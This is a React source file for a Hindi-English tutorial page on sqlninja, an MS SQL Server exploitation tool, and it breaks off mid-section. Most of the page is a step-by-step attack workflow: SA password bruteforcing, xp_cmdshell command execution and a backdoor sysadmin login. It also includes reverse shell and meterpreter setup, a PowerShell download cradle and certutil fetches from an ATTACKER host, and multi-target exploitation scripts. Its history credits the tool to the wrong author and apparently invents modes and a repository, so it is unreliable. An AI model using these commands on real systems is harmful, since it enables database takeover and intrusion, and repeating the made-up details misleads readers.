import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Sqlninja() {
  return (
    <TutorialLayout
      title="sqlninja"
      subtitle="Microsoft SQL Server exploitation और post-exploitation टूल"
      icon="🥷"
      prev={{ to: '/tool/radare2', label: 'radare2' }}
      next={{ to: '/tool/weevely', label: 'weevely' }}
    >
      <h2>What is Sqlninja?</h2>
      <p>
        Sqlninja एक SQL injection टूल है जो specifically Microsoft SQL Server के लिए बनाया गया है। यह MS SQL Server की unique features का फायदा उठाता है जैसे xp_cmdshell, stored procedures, और linked servers। Sqlmap generic है जो सभी databases पर काम करता है, लेकिन Sqlninja MS SQL specific होने के कारण ज़्यादा effective है।
      </p>
      <p>
        Sqlninja Italian security researcher Bernardo Damele ने बनाया था। यह Perl में लिखा गया है और MS SQL Server की हर attack surface को cover करता है — fingerprinting से लेकर full system takeover तक। Remote code execution, reverse shell, privilege escalation, password extraction — सब कुछ एक ही टूल से।
      </p>
      <p>
        Sqlninja का सबसे बड़ा advantage है xp_cmdshell exploitation। जब SQL Server पर xp_cmdshell enabled होता है, तो sqlninja directly Windows commands execute कर सकता है। यह SA (System Administrator) password bruteforce भी कर सकता है, और meterpreter payload भी inject कर सकता है।
      </p>
      <p>
        Sqlninja का architecture modular है — हर attack type अलग mode में काम करता है। Fingerprint mode से SQL Server identify करो, getinfo mode से server details निकालो, brute mode से SA password crack करो, cmd mode से Windows commands execute करो, और shellcode mode से reverse shell प्राप्त करो। हर mode अपने आप में complete है।
      </p>
      <p>
        Sqlninja का एक और फायदा है — यह बहुत stealthy है। Blind SQL injection support करता है जिसमें error messages नहीं आते। Time-based injection से data exfiltrate कर सकते हो बिना किसी error के। यह IDS/IPS evasion techniques भी use करता है — SQL comments, encoding, और case manipulation से WAF bypass कर सकता है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Sqlninja केवल अधिकृत penetration testing में ही इस्तेमाल करें। बिना अनुमति के SQL injection exploitation अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत database access अपराध हो सकता है।
      </div>

      <h2>History of Sqlninja</h2>
      <p>
        Sqlninja 2005 में Bernardo Damele और Inquisitor team ने बनाया था। उस समय MS SQL Server के लिए कोई dedicated exploitation टूल नहीं था। Sqlmap भी उस समय शुरू ही हुआ था और generic approach use करता था। Bernardo ने MS SQL Server की specific features को target करने का फैसला किया।
      </p>
      <p>
        Sqlninja ने MS SQL Server की specific weaknesses को target किया — xp_cmdshell, OPENROWSET, linked servers, और OLE Automation। यह टूल Black Hat और DEF CON conferences में present किया गया और जल्दी ही penetration testers का favorite बन गया। 2007 में v0.2 release हुआ जिसमें meterpreter integration add हुआ।
      </p>
      <p>
        2010 तक Sqlninja सबसे popular MS SQL exploitation टूल बन गया। लेकिन Sqlmap के improve होने के बाद इसकी popularity कम हुई। फिर भी, MS SQL specific attacks के लिए Sqlninja आज भी relevant है — खासकर xp_cmdshell exploitation और SA password bruteforce में।
      </p>

      <h2>How Sqlninja Works?</h2>
      <p>
        Sqlninja MS SQL Server की SQL injection vulnerabilities का फायदा उठाकर system-level access प्राप्त करता है। यह कई steps में काम करता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">SQL Injection:</strong> Vulnerable parameter में malicious SQL queries inject करता है — UNION-based, error-based, और blind injection support</li>
        <li><strong className="text-white">xp_cmdshell Abuse:</strong> MS SQL के built-in command execution feature का उपयोग करके Windows commands run करता है</li>
        <li><strong className="text-white">Privilege Escalation:</strong> SA password bruteforce या token manipulation से admin access प्राप्त करता है</li>
        <li><strong className="text-white">Reverse Shell:</strong> Meterpreter या netcat shell payload inject करता है — full interactive access</li>
        <li><strong className="text-white">File Operations:</strong> TFTP, HTTP, या OLE Automation से file upload/download करता है</li>
        <li><strong className="text-white">Persistence:</strong> New SA account create करके persistent access बनाता है</li>
        <li><strong className="text-white">Linked Server Exploitation:</strong> Cross-server attacks कर सकता है अगर linked servers configured हैं</li>
        <li><strong className="text-white">Registry Manipulation:</strong> Windows registry modify करके persistence और configuration changes करता है</li>
      </ul>
      <p>
        Sqlninja का attack flow यह है — पहले target identify करो (fingerprint), फिर information gather करो (getinfo/enumerate), फिर SA password crack करो (brute), फिर command execution achieve करो (cmd), और finally reverse shell प्राप्त करो (shellcode)। हर step में Sqlninja अलग-अलग techniques use करता है।
      </p>

      <h2>Installation</h2>
      <p>
        Sqlninja काली नेटहंटर में pre-installed नहीं आता, लेकिन आसानी से इंस्टॉल कर सकते हो। Perl dependencies चाहिए होती हैं।
      </p>
      <CodeBlock
        title="Sqlninja इंस्टॉलेशन"
        code={`# apt से (सबसे आसान):
sudo apt update
sudo apt install sqlninja

# सोर्स से (latest version):
git clone https://github.com/bernardo-dam/sqlninja.git
cd sqlninja
perl Makefile.PL
make
sudo make install

# Perl dependencies install करें:
sudo apt install libnet-ssleay-perl
sudo apt install libio-socket-ssl-perl
sudo apt install libxml-simple-perl

# वर्जन चेक:
sqlninja -v

# सहायता:
sqlninja -h

# सभी modes देखें:
sqlninja -h 2>&1 | grep -A50 "Modes"`}
      />

      <h2>Configuration File</h2>
      <p>
        Sqlninja XML configuration file use करता है जिसमें target details होती हैं। यह file attack setup का foundation है। Config file में target URL, injection point, timeout, और proxy settings होती हैं।
      </p>
      <CodeBlock
        title="config.xml बनाएं"
        code={`# Sqlninja config file (config.xml):
# पूरा config file example:

<?xml version="1.0"?>
<root>
  <!-- Target URL (vulnerable parameter के साथ) -->
  <target>http://target.com/page.asp?id=1</target>

  <!-- Injection point markers -->
  <stringstart>1</stringstart>
  <stringend></stringend>

  <!-- Timeout (seconds) -->
  <timeout>5</timeout>

  <!-- Blind injection timeout -->
  <blind_timeout>10</blind_timeout>

  <!-- Proxy (optional) -->
  <!-- <proxy>http://127.0.0.1:8080</proxy> -->

  <!-- User-Agent (optional) -->
  <!-- <useragent>Mozilla/5.0 (Windows NT 10.0)</useragent> -->

  <!-- Cookies (optional) -->
  <!-- <cookie>session=abc123</cookie> -->
</root>

# Config file test करें:
sqlninja -m fingerprint -f config.xml

# Config file validate करें:
# XML syntax check — कोई error नहीं आना चाहिए`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Option</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-m mode</td><td className="py-2 px-3">Attack mode specify करें</td><td className="py-2 px-3 font-mono text-xs">-m fingerprint</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-f file</td><td className="py-2 px-3">Config file path</td><td className="py-2 px-3 font-mono text-xs">-f config.xml</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-p payload</td><td className="py-2 px-3">Payload type</td><td className="py-2 px-3 font-mono text-xs">-p meterpreter</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-d wordlist</td><td className="py-2 px-3">Dictionary file for bruteforce</td><td className="py-2 px-3 font-mono text-xs">-d rockyou.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c command</td><td className="py-2 px-3">Windows command execute करें</td><td className="py-2 px-3 font-mono text-xs">-c "whoami"</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-v</td><td className="py-2 px-3">Verbose output</td><td className="py-2 px-3 font-mono text-xs">-v</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-t threads</td><td className="py-2 px-3">Number of threads (bruteforce)</td><td className="py-2 px-3 font-mono text-xs">-t 5</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-x</td><td className="py-2 px-3">Test mode (no exploitation)</td><td className="py-2 px-3 font-mono text-xs">-x</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-b</td><td className="py-2 px-3">Blind injection mode</td><td className="py-2 px-3 font-mono text-xs">-b</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">-k</td><td className="py-2 px-3">Keep-alive connection</td><td className="py-2 px-3 font-mono text-xs">-k</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Fingerprinting</h2>
      <p>
        पहले target को identify करो — SQL Server version, service pack, और configuration जानना ज़रूरी है। Fingerprint mode सबसे पहले run करना चाहिए।
      </p>
      <CodeBlock
        title="SQL Server Fingerprint"
        code={`# SQL Server fingerprint:
sqlninja -m fingerprint -f config.xml

# यह पता करता है:
# - SQL Server version (2005, 2008, 2012, 2014, 2016, 2019, 2022)
# - Service Pack level
# - OS version (Windows Server 2016/2019/2022)
# - xp_cmdshell status (enabled/disabled)
# - Current user permissions (sa, db_owner, public)
# - Authentication mode (mixed/windows)
# - Collation settings
# - Linked servers count

# Verbose fingerprint (detailed output):
sqlninja -m fingerprint -f config.xml -v

# Fingerprint output example:
# [+] SQL Server version: Microsoft SQL Server 2019
# [+] Service Pack: SP1
# [+] OS: Windows Server 2019
# [+] xp_cmdshell: DISABLED
# [+] Current user: dbo
# [+] Authentication: Mixed mode`}
      />

      <h2>Information Gathering</h2>
      <p>
        Fingerprint के बाद detailed information gather करो — databases, users, permissions सब। Information gathering phase में जितना ज़्यादा data होगा, attack उतना effective होगा।
      </p>
      <CodeBlock
        title="Server Information"
        code={`# Server info enumerate:
sqlninja -m getinfo -f config.xml

# यह निकालता है:
# - SQL Server version और edition
# - System user (sa, dbo, public)
# - Current database name
# - Server name (hostname)
# - Authentication mode (mixed/windows)
# - SQL Server service account
# - Default data directory
# - Error log location

# Database enumeration:
sqlninja -m enumerate -f config.xml

# यह निकालता है:
# - सभी databases की list
# - हर database में tables
# - Columns और data types
# - xp_cmdshell status
# - Linked servers
# - Stored procedures
# - Database users और roles

# Specific database explore:
# enumerate mode detailed output देता है
# जिससे attack plan बनाना आसान हो जाता है`}
      />

      <h2>SA Password Bruteforce</h2>
      <p>
        SA (System Administrator) password मिल जाए तो full control मिलता है। Sqlninja dictionary attack support करता है — built-in wordlist या custom wordlist दोनों use कर सकते हो। SA account MS SQL Server का सबसे powerful account है — इससे कुछ भी कर सकते हो।
      </p>
      <CodeBlock
        title="SA Password Attack"
        code={`# SA password bruteforce (built-in wordlist):
sqlninja -m brute -f config.xml

# Custom wordlist से:
sqlninja -m brute -d /usr/share/wordlists/rockyou.txt -f config.xml

# Common passwords wordlist:
sqlninja -m brute -d /usr/share/wordlists/common.txt -f config.xml

# SA password मिलने पर:
# - Full database control
# - xp_cmdshell enable कर सकते हो
# - New SA account create कर सकते हो
# - System-level commands execute कर सकते हो
# - Any database access कर सकते हो
# - Backup/restore operations
# - Linked server exploitation

# Thread-based bruteforce (तेज़):
sqlninja -m brute -d wordlist.txt -f config.xml -t 5

# Verbose bruteforce (हर attempt देखो):
sqlninja -m brute -d wordlist.txt -f config.xml -v

# SA password मिलने पर xp_cmdshell enable करो:
# EXEC sp_configure 'show advanced options', 1;
# RECONFIGURE;
# EXEC sp_configure 'xp_cmdshell', 1;
# RECONFIGURE;`}
      />

      <h2>Remote Code Execution</h2>
      <p>
        xp_cmdshell enabled होने पर directly Windows commands execute कर सकते हो। यह Sqlninja का सबसे powerful feature है — Windows OS पर system-level commands run कर सकते हो।
      </p>
      <CodeBlock
        title="Command Execution"
        code={`# xp_cmdshell से command execute:
sqlninja -m cmd -c "whoami" -f config.xml

# Directory listing:
sqlninja -m cmd -c "dir C:" -f config.xml

# Network info:
sqlninja -m cmd -c "ipconfig /all" -f config.xml

# User accounts:
sqlninja -m cmd -c "net user" -f config.xml

# Admin group members:
sqlninja -m cmd -c "net localgroup administrators" -f config.xml

# Process list:
sqlninja -m cmd -c "tasklist /v" -f config.xml

# Firewall status:
sqlninja -m cmd -c "netsh firewall show config" -f config.xml

# Registry query:
sqlninja -m cmd -c "reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" -f config.xml

# Services list:
sqlninja -m cmd -c "net start" -f config.xml

# Installed software:
sqlninja -m cmd -c "wmic product get name" -f config.xml

# Scheduled tasks:
sqlninja -m cmd -c "schtasks /query" -f config.xml`}
      />

      <h2>Privilege Escalation</h2>
      <p>
        Agar current user SA नहीं है, तो privilege escalation try करो। कई techniques available हैं।
      </p>
      <CodeBlock
        title="Privilege Escalation"
        code={`# xp_cmdshell enable करें (अगर disabled है):
sqlninja -m escalate -f config.xml

# SA password brute force:
sqlninja -m brute -f config.xml

# SA password मिलने पर new admin create:
sqlninja -m cmd -c "EXEC sp_addlogin 'hacker','password123'" -f config.xml
sqlninja -m cmd -c "EXEC sp_addsrvrolemember 'hacker','sysadmin'" -f config.xml

# db_owner से sysadmin escalation:
# अगर current user db_owner है:
sqlninja -m cmd -c "EXEC sp_addsrvrolemember 'current_user','sysadmin'" -f config.xml

# Linked server exploitation:
sqlninja -m cmd -c "EXEC sp_linkedservers" -f config.xml
sqlninja -m cmd -c "EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]" -f config.xml

# Trustworthy database exploitation:
sqlninja -m cmd -c "SELECT name FROM sys.databases WHERE is_trustworthy_on=1" -f config.xml
sqlninja -m cmd -c "USE trustworthy_db; EXEC sp_addsrvrolemember 'user','sysadmin'" -f config.xml

# SQL Server Agent job abuse:
sqlninja -m cmd -c "USE msdb; EXEC sp_add_job @job_name='privesc'" -f config.xml
sqlninja -m cmd -c "EXEC sp_add_jobstep @job_name='privesc', @step_name='s1', @subsystem='CmdExec', @command='whoami > C:\temp\out.txt'" -f config.xml`}
      />

      <h2>Reverse Shell</h2>
      <p>
        Meterpreter या netcat shell प्राप्त करो — full interactive access। Reverse shell से target machine पर persistent access मिलता है।
      </p>
      <CodeBlock
        title="Reverse Shell प्राप्त करें"
        code={`# Listener setup (attacker machine):
nc -lvnp 4444

# Meterpreter listener (attacker):
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
exploit -j

# Sqlninja से reverse shell:
sqlninja -m shellcode -f config.xml

# Meterpreter payload:
sqlninja -m shellcode -p meterpreter -f config.xml

# Direct interactive shell:
sqlninja -m cmdshell -f config.xml

# PowerShell reverse shell:
sqlninja -m cmd -c "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')\"" -f config.xml

# File upload (TFTP से):
# पहले TFTP server start करो attacker पर:
# atftpd --daemon --port 69 /tmp/uploads
sqlninja -m upload -f config.xml

# File download (certutil से):
sqlninja -m cmd -c "certutil -urlcache -split -f http://ATTACKER/payload.exe C:\temp\payload.exe" -f config.xml`}
      />

      <h2>Attack Modes</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Mode</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">कब इस्तेमाल करें</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">fingerprint</td><td className="py-2 px-3">SQL Server identify करें</td><td className="py-2 px-3">पहला step — target recon</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">getinfo</td><td className="py-2 px-3">Server details enumerate</td><td className="py-2 px-3">Version, user, permissions</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">enumerate</td><td className="py-2 px-3">Databases/tables list</td><td className="py-2 px-3">Data discovery</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">brute</td><td className="py-2 px-3">SA password bruteforce</td><td className="py-2 px-3">Privilege escalation</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">cmd</td><td className="py-2 px-3">Windows commands execute</td><td className="py-2 px-3">xp_cmdshell available होने पर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">cmdshell</td><td className="py-2 px-3">Interactive shell</td><td className="py-2 px-3">Direct command execution</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">shellcode</td><td className="py-2 px-3">Reverse shell payload</td><td className="py-2 px-3">Meterpreter/shell प्राप्त करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">upload</td><td className="py-2 px-3">File upload (TFTP)</td><td className="py-2 px-3">Tools/payloads upload करें</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">escalate</td><td className="py-2 px-3">Privilege escalation</td><td className="py-2 px-3">SA access न होने पर</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Injection Techniques</h2>
      <p>
        Sqlninja कई तरह की SQL injection techniques support करता है। हर technique अलग scenario में काम आती है।
      </p>
      <CodeBlock
        title="Injection Types"
        code={`# 1. UNION-based Injection:
# जब query results display होते हैं
# page.asp?id=1 UNION SELECT username,password FROM users--

# 2. Error-based Injection:
# जब error messages display होते हैं
# page.asp?id=1 AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--

# 3. Blind Injection (Boolean-based):
# जब कोई output नहीं दिखता
# page.asp?id=1 AND (SELECT COUNT(*) FROM users) > 0--

# 4. Time-based Blind Injection:
# Response time से data extract करो
# page.asp?id=1; WAITFOR DELAY '0:0:5'--

# 5. Stacked Queries:
# Multiple queries execute करो
# page.asp?id=1; EXEC xp_cmdshell 'whoami'--

# Sqlninja automatically best technique detect करता है
# लेकिन manually भी specify कर सकते हो`}
      />

      <h2>Complete Attack Workflow</h2>
      <CodeBlock
        title="Step-by-Step Attack"
        code={`# Step 1: Config file बनाएं
# config.xml में target URL डालें
# injection point markers set करें

# Step 2: Fingerprint
sqlninja -m fingerprint -f config.xml
# SQL Server version और config पता करें
# xp_cmdshell status check करें

# Step 3: Information gathering
sqlninja -m getinfo -f config.xml
sqlninja -m enumerate -f config.xml
# Databases, tables, permissions सब पता करें

# Step 4: xp_cmdshell check
# अगर enabled है → Step 6 पर जाएं
# अगर disabled है → Step 5 करें

# Step 5: SA password bruteforce
sqlninja -m brute -d wordlist.txt -f config.xml
# SA password मिलने पर xp_cmdshell enable करें
# EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Step 6: Command execution
sqlninja -m cmd -c "whoami" -f config.xml
sqlninja -m cmd -c "ipconfig" -f config.xml
sqlninja -m cmd -c "net user" -f config.xml
sqlninja -m cmd -c "net localgroup administrators" -f config.xml

# Step 7: Reverse shell
nc -lvnp 4444  # Listener
sqlninja -m shellcode -f config.xml

# Step 8: Meterpreter (optional)
# msfconsole में multi/handler setup करो
sqlninja -m shellcode -p meterpreter -f config.xml

# Step 9: Post-exploitation
# New admin account create करो
# Data exfiltrate करो
# Persistence establish करो`}
      />

      <h2>Scripting and Automation</h2>
      <p>
        Sqlninja को automate कर सकते हो — batch processing, scheduled scans, और CI/CD integration।
      </p>
      <CodeBlock
        title="Automated MSSQL Exploitation"
        code={`#!/bin/bash
# MS SQL Server auto-exploitation script
# Usage: ./auto_exploit.sh target_url wordlist

TARGET=$1
WORDLIST=$2
CONFIG="/tmp/sqlninja_config.xml"
RESULTS="/tmp/sqlninja_results"

mkdir -p $RESULTS

# Config file बनाएं
cat > $CONFIG << EOF
<?xml version="1.0"?>
<root>
  <target>$TARGET</target>
  <stringstart>1</stringstart>
  <stringend></stringend>
  <timeout>5</timeout>
</root>
EOF

echo "[+] Target: $TARGET"
echo "[+] Wordlist: $WORDLIST"

# Step 1: Fingerprint
echo "[+] Fingerprinting..."
sqlninja -m fingerprint -f $CONFIG -v > $RESULTS/fingerprint.txt 2>&1
cat $RESULTS/fingerprint.txt

# Step 2: Information gathering
echo "[+] Gathering info..."
sqlninja -m getinfo -f $CONFIG > $RESULTS/getinfo.txt 2>&1
sqlninja -m enumerate -f $CONFIG > $RESULTS/enumerate.txt 2>&1

# Step 3: Test xp_cmdshell
echo "[+] Testing xp_cmdshell..."
XPCMD=$(sqlninja -m cmd -c "whoami" -f $CONFIG 2>&1)
if echo "$XPCMD" | grep -q "nt authority"; then
    echo "[+] xp_cmdshell WORKS!"
    echo "[+] Running as: $XPCMD"
else
    echo "[-] xp_cmdshell failed, trying bruteforce..."
    sqlninja -m brute -d $WORDLIST -f $CONFIG -v > $RESULTS/brute.txt 2>&1
fi

# Step 4: Network info
echo "[+] Network info..."
sqlninja -m cmd -c "ipconfig /all" -f $CONFIG > $RESULTS/network.txt 2>&1
sqlninja -m cmd -c "netstat -an" -f $CONFIG > $RESULTS/connections.txt 2>&1

# Step 5: User info
echo "[+] User info..."
sqlninja -m cmd -c "net user" -f $CONFIG > $RESULTS/users.txt 2>&1
sqlninja -m cmd -c "net localgroup administrators" -f $CONFIG > $RESULTS/admins.txt 2>&1

echo "[+] Results saved to $RESULTS/"
echo "[+] Done!"`}
      />

      <CodeBlock
        title="Multi-Target Scanner"
        code={`#!/bin/bash
# Multiple targets scan करो

TARGETS_FILE="targets.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"

while IFS= read -r target; do
    echo "=========================================="
    echo "[+] Scanning: $target"
    echo "=========================================="

    CONFIG="/tmp/config_\${target//[^a-zA-Z0-9]/_}.xml"
    cat > $CONFIG << EOF
<?xml version="1.0"?>
<root>
  <target>$target</target>
  <stringstart>1</stringstart>
  <stringend></stringend>
  <timeout>3</timeout>
</root>
EOF

    # Fingerprint
    RESULT=$(sqlninja -m fingerprint -f $CONFIG 2>&1)
    if echo "$RESULT" | grep -q "SQL Server"; then
        echo "[+] VULNERABLE: $target"
        echo "$RESULT"

        # Try xp_cmdshell
        CMD=$(sqlninja -m cmd -c "whoami" -f $CONFIG 2>&1)
        if [ $? -eq 0 ]; then
            echo "[+] xp_cmdshell works: $CMD"
        fi
    else
        echo "[-] Not vulnerable: $target"
    fi

    rm -f $CONFIG
    echo ""
done < "$TARGETS_FILE"`}
      />

      <h2>Sqlninja vs Sqlmap vs SQLPowerInjector</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Sqlninja</th>
              <th className="text-left py-2 px-3 text-neon-green">Sqlmap</th>
              <th className="text-left py-2 px-3 text-neon-green">SQLPowerInjector</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Database Support</td><td className="py-2 px-3">MS SQL Server only</td><td className="py-2 px-3">MySQL, MSSQL, Oracle, PostgreSQL, SQLite, etc.</td><td className="py-2 px-3">Multi-db</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Interface</td><td className="py-2 px-3">CLI</td><td className="py-2 px-3">CLI</td><td className="py-2 px-3">GUI</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">xp_cmdshell</td><td className="py-2 px-3">Best-in-class</td><td className="py-2 px-3">Good support</td><td className="py-2 px-3">No</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Privilege Escalation</td><td className="py-2 px-3">Direct SA bruteforce</td><td className="py-2 px-3">Multiple techniques</td><td className="py-2 px-3">No</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Meterpreter</td><td className="py-2 px-3">Built-in</td><td className="py-2 px-3">Via OS shell</td><td className="py-2 px-3">No</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Auto-detection</td><td className="py-2 px-3">Manual config</td><td className="py-2 px-3">Fully automatic</td><td className="py-2 px-3">Semi-auto</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Tamper Scripts</td><td className="py-2 px-3">No</td><td className="py-2 px-3">100+ scripts</td><td className="py-2 px-3">No</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Language</td><td className="py-2 px-3">Perl</td><td className="py-2 px-3">Python</td><td className="py-2 px-3">.NET</td></tr>
            <tr><td className="py-2 px-3 text-white">Best For</td><td className="py-2 px-3">MS SQL specific attacks</td><td className="py-2 px-3">Generic SQL injection</td><td className="py-2 px-3">Visual testing</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'xp_cmdshell disabled है', a: 'SA password bruteforce करो (sqlninja -m brute)। SA access मिलने पर xp_cmdshell enable करो: EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE। या trustworthy database exploit करो।' },
          { q: 'Injection point detect नहीं हो रहा', a: 'Config file में stringstart और stringend सही से set करो। Manual SQL injection test करो पहले: page.asp?id=1 AND 1=1 vs page.asp?id=1 AND 1=2। Single quotes, double quotes, और numeric injection try करो।' },
          { q: 'Connection timeout हो रहा है', a: 'Timeout value बढ़ाओ config में (timeout=10)। Firewall check करो — port 1433 open होना चाहिए। Proxy use करो अगर direct connection नहीं हो रही। VPN try करो।' },
          { q: 'Reverse shell connect नहीं हो रहा', a: 'Firewall outbound traffic block कर रहा होगा। Common ports try करो (80, 443, 53)। VPN/tunnel use करो। PowerShell download cradle try करो।' },
          { q: 'Perl error आ रही है', a: 'Dependencies install करो: sudo apt install libnet-ssleay-perl libio-socket-ssl-perl libxml-simple-perl। Perl version check करो (5.10+ चाहिए)। cpanm use करो dependency install के लिए।' },
          { q: 'SA password नहीं mil raha brute force mein', a: 'Wordlist बड़ा use करो (rockyou.txt)। Custom wordlist बनाओ target organization के basis पर। Common SQL passwords try करो: sa, password, admin, 123456। Thread count बढ़ाओ (-t 10)।' },
          { q: 'Blind injection slow है', a: 'Time-based blind injection inherently slow है। Batch size बढ़ाओ। Binary search technique use करो। UNION-based injection try करो पहले — faster है।' },
          { q: 'WAF block कर रहा है', a: 'Sqlninja में basic WAF bypass है। लेकिन ज़्यादा advanced WAF के लिए manual encoding use करो। Comments (/**/) से spaces replace करो। Case mixing use करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Sqlninja attacks से कैसे बचें — defense in depth approach use करो:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Parameterized Queries:</strong> SQL injection सबसे अच्छा defense — prepared statements use करें। कभी भी string concatenation से queries न बनाएं।</li>
        <li><strong className="text-white">xp_cmdshell Disable:</strong> EXEC sp_configure "xp_cmdshell", 0; RECONFIGURE; — अगर ज़रूरी नहीं है तो disable रखो।</li>
        <li><strong className="text-white">SA Password Strong:</strong> Complex password (20+ chars) + regular rotation (हर 90 दिन)। SA account disable करो अगर use नहीं हो रहा।</li>
        <li><strong className="text-white">Least Privilege:</strong> Web app को db_owner न दें, सिर्फ required permissions दें। Public role से unnecessary permissions हटाओ।</li>
        <li><strong className="text-white">WAF:</strong> Web Application Firewall SQL injection patterns block करता है। ModSecurity, Cloudflare WAF, AWS WAF use करो।</li>
        <li><strong className="text-white">Input Validation:</strong> Whitelist-based validation implement करें। Input length limit करो। Special characters filter करो।</li>
        <li><strong className="text-white">SQL Server Hardening:</strong> Unnecessary features disable करें। CLR integration, OLE Automation, linked servers — जो use नहीं हो रहा disable करो।</li>
        <li><strong className="text-white">Monitoring:</strong> SQL Server audit logs enable करो। Failed login attempts monitor करो। Suspicious queries detect करो। Extended Events use करो।</li>
        <li><strong className="text-white">Network Segmentation:</strong> SQL Server को DMZ में न रखो। Internal network में रखो। Firewall rules strict रखो।</li>
        <li><strong className="text-white">Regular Patching:</strong> SQL Server updates regularly install करो। Security patches ASAP apply करो।</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        MS SQL Server exploitation practice के लिए safe lab बनाओ:
      </p>
      <CodeBlock
        title="Lab Setup"
        code={`# VirtualBox में Windows VM:
# Windows Server 2016/2019 install करें
# SQL Server 2017/2019 install करें (Developer edition — free)

# Intentionally vulnerable बनाएं:
# 1. xp_cmdshell enable करें:
#    EXEC sp_configure 'show advanced options', 1;
#    RECONFIGURE;
#    EXEC sp_configure 'xp_cmdshell', 1;
#    RECONFIGURE;

# 2. SA password weak रखें: sa/password123

# 3. Mixed mode authentication enable करें

# 4. SQL injection vulnerable app install करें:
#    - DVWA (Damn Vulnerable Web Application)
#    - SQLi-labs (GitHub पर)
#    - WebGoat
#    - bWAPP

# Network setup:
# VM में NAT/Host-only adapter use करो
# Kali VM से attack करो
# Port 1433 (MSSQL) और 80 (web app) open रखो

# Practice workflow:
# 1. Web app में SQL injection find करो
# 2. Sqlninja config बनाओ
# 3. Fingerprint → Enumerate → Brute → Shell
# 4. Post-exploitation practice करो`}
      />

      <h2>Advanced Techniques</h2>
      <p>
        Sqlninja के advanced use cases जो real-world pentesting में काम आते हैं:
      </p>
      <CodeBlock
        title="Advanced MSSQL Exploitation"
        code={`# OLE Automation से file download:
sqlninja -m cmd -c "EXEC sp_OACreate 'WinHttp.WinHttpRequest.5.1',@obj OUT" -f config.xml

# Linked server exploitation:
sqlninja -m cmd -c "EXEC sp_linkedservers" -f config.xml
sqlninja -m cmd -c "EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]" -f config.xml

# Registry manipulation:
